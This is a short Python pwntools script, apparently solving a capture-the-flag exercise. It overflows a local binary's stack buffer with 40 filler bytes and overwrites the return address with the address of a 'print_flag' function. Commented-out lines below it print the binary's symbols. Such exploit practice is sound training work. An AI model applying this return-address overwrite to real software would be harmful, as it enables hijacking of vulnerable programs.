from pwn import *

p = process('./hi')
elf = ELF('./hi')
p.sendline(b'A'*40 # 
           + p64(elf.symbols['print_flag']))
p.interactive()

# from pwn import *

# elf = ELF("./hi")

# print ("This binary has many symbols:")
# print (elf.symbols)

# p = process("./hi")

# p.sendline("Andrea")

# print (p.recvall())